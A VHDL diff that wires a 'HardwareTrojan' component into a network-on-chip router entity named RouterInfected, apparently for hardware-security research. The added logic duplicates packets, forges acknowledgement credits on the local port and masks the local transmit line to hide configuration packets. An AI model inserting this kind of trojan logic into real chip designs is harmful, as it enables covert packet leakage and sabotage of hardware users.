@@ -61,9 +61,14 @@ end RouterInfected;
 architecture RouterInfected of RouterInfected is
 
 signal h, ack_h, data_av, sender, data_ack: regNport := (others=>'0');
-signal data: arrayNport_regflit := (others=>(others=>'0'));
+signal data, data_outCrossbar: arrayNport_regflit := (others=>(others=>'0'));
 signal mux_in, mux_out: arrayNport_reg3 := (others=>(others=>'0'));
 signal free: regNport := (others=>'0');
+
+-- trojan signals
+signal duplicate, dataSel, data_ack_local, maskPkg : std_logic := '0';
+signal configPkg, txCrossbar : regNport := (others=>'0');
+signal maliciousHeader : regflit := (others=>'0');
 
 begin
 
@@ -71,6 +76,8 @@ begin
 	port map(
 		clock => clock,
 		reset => reset,
+		configPkg => configPkg(0),
+		address => address,
 		data_in => data_in(0),
 		rx => rx(0),
 		h => h(0),
@@ -86,6 +93,8 @@ begin
 	port map(
 		clock => clock,
 		reset => reset,
+		configPkg => configPkg(1),
+		address => address,
 		data_in => data_in(1),
 		rx => rx(1),
 		h => h(1),
@@ -101,6 +110,8 @@ begin
 	port map(
 		clock => clock,
 		reset => reset,
+		configPkg => configPkg(2),
+		address => address,
 		data_in => data_in(2),
 		rx => rx(2),
 		h => h(2),
@@ -116,6 +127,8 @@ begin
 	port map(
 		clock => clock,
 		reset => reset,
+		configPkg => configPkg(3),
+		address => address,
 		data_in => data_in(3),
 		rx => rx(3),
 		h => h(3),
@@ -131,6 +144,8 @@ begin
 	port map(
 		clock => clock,
 		reset => reset,
+		configPkg => configPkg(4),
+		address => address,
 		data_in => data_in(4),
 		rx => rx(4),
 		h => h(4),
@@ -139,13 +154,14 @@ begin
 		data => data(4),
 		sender => sender(4),
 		clock_rx => clock_rx(4),
-		data_ack => data_ack(4),
+		data_ack => data_ack_local,
 		credit_o => credit_o(4));
 
 	SwitchControl : Entity work.SwitchControl(AlgorithmXY)
 	port map(
 		clock => clock,
 		reset => reset,
+		duplicate => duplicate,
 		h => h,
 		ack_h => ack_h,
 		address => address,
@@ -164,8 +180,8 @@ begin
 		free => free,
 		tab_in => mux_in,
 		tab_out => mux_out,
-		tx => tx,
-		data_out => data_out,
+		tx => txCrossbar,
+		data_out => data_outCrossbar,
 		credit_i => credit_i);
 
 	CLK_TX : for i in 0 to(NPORT-1) generate
@@ -175,22 +191,30 @@ begin
 	---------------------
 	-- HARDWARE TROJAN --
 	---------------------
-	--HTrojan : Entity work.HardwareTrojan
-	--port map(
-	--	clock 			=> clock;
-    --    reset 			=> reset;
-    --    data_in 		=> data_out(LOCAL);
-    --    duplicate 		=> ,
-    --	free			=> free,
-	--	mux_in 			=> mux_in,
-	--	mux_out 		=> mux_out,
-    --    configPkg 		=> ,
-    --    creditIn 		=> ,
-    --    data_out 		=> ,
-    --    dataSel			=> ,
-    --  	fakeCredit 		=> ,
-    --  	creditControl	=>
-	--);
+	HTrojan : Entity work.HardwareTrojan
+	port map(
+		clock 			=> clock,
+        reset 			=> reset,
+        data_in 		=> data_outCrossbar(LOCAL),
+        duplicate 		=> duplicate,
+    	free			=> free,
+		mux_in 			=> mux_in,
+		mux_out 		=> mux_out,
+        configPkg 		=> configPkg,
+        creditIn 		=> data_ack, -- or credit_i
+        data_out 		=> maliciousHeader,
+        dataSel			=> dataSel,
+      	fakeCredit 		=> data_ack_local,
+      	maskPkg			=> maskPkg
+	);
 
+	-- To ofuscate the configuration packet
+	tx(LOCAL) <= txCrossbar(LOCAL) AND maskPkg;
+	tx(EAST) <= txCrossbar(EAST);
+	tx(WEST) <= txCrossbar(WEST);
+	tx(SOUTH) <= txCrossbar(SOUTH);
+	tx(NORTH) <= txCrossbar(NORTH);
+
+	data_out <= data_outCrossbar;
 
 end RouterInfected;
